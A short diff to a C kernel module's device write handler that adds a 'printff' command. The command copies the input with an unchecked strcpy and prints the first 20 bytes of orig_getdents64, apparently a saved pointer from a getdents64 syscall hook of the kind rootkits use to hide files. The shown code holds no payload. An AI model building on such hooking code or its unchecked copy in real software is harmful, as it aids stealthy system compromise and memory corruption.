@@ -485,6 +485,13 @@ ssize_t writer(struct file *filep, const char *buff, size_t count, loff_t *offp)
         }
     }
 
+    if(memcmp("printff", tmpdata, strlen("printff")) == 0){
+        if(strlen(tmpdata) == strlen("printff")){
+            strcpy(last_data, tmpdata);
+            print_function((uintptr_t)orig_getdents64, 20);
+        }
+    }
+
 #ifdef KITE_DEBUG
 	pr_info("User Sent: %s\n", tmpdata);
 #endif
